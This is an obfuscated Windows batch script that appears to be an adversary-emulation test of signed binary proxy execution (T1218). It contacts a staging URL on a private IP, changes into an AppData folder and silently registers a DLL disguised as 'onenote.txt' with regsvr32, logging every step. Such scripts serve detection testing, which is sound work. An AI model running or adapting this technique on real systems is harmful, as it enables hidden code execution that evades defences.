@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET jgfshv=%APPDATA%\8880\1b8d7d8f
SET ymxzdl=https://10.0.0.49
SET qrytgf=https://10.0.0.49/stage/2/icon.png?8880-7
SET kpwndb=BALAM-S2B
SET hlcfxm=7
SET vxnzdt=onenote.txt
SET mhdsjz=8880
SET zxbrgt=%APPDATA%\!hlcfxm!\macula-simulations.log
SET dfhysa=!zxbrgt!
SET yfhtsk=!hlcfxm!
SET nwgqxb=!mhdsjz!
SET swrkgq=!kpwndb!
SET rvxzfn=T1218
SET tsgdbh=Signed_Binary_Proxy_Execution

echo [!DATE! !TIME!][DEBUG][!swrkgq!]: heartbeat_started>> "!dfhysa!" 2>nul
curl -k -s -o nul "!qrytgf!"
SET tftxwb=!ERRORLEVEL!
if !tftxwb! EQU 0 (
    SET tdbglq=1
    SET qnprvd=
) else (
    SET tdbglq=0
    SET qnprvd=curl_failed_!tftxwb!
)
echo [!DATE! !TIME!][!swrkgq!]: !yfhtsk!-!nwgqxb!-!rvxzfn!|!tsgdbh!=!tdbglq!:!qnprvd!>> "!dfhysa!" 2>nul
echo [!DATE! !TIME!][DEBUG][!swrkgq!]: heartbeat_result=!tdbglq!>> "!dfhysa!" 2>nul

echo [!DATE! !TIME!][DEBUG][!swrkgq!]: chdir_start=!jgfshv!>> "!dfhysa!" 2>nul
cd /d "!jgfshv!" >nul 2>&1
SET rbgjsa=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!swrkgq!]: chdir_result=!rbgjsa!>> "!dfhysa!" 2>nul

echo [!DATE! !TIME!][DEBUG][!swrkgq!]: dll_load_start=!vxnzdt!>> "!dfhysa!" 2>nul
regsvr32.exe /s "!vxnzdt!"
SET wqxmky=!ERRORLEVEL!
if !wqxmky! EQU 0 (
    SET xywzhv=1
    SET tmszfg=
) else (
    SET xywzhv=0
    SET tmszfg=load_failed_!wqxmky!
)
echo [!DATE! !TIME!][DEBUG][!swrkgq!]: dll_load_result=!wqxmky!>> "!dfhysa!" 2>nul
echo [!DATE! !TIME!][!swrkgq!]: !yfhtsk!-!nwgqxb!-!rvxzfn!|!tsgdbh!=!xywzhv!:!tmszfg!>> "!dfhysa!" 2>nul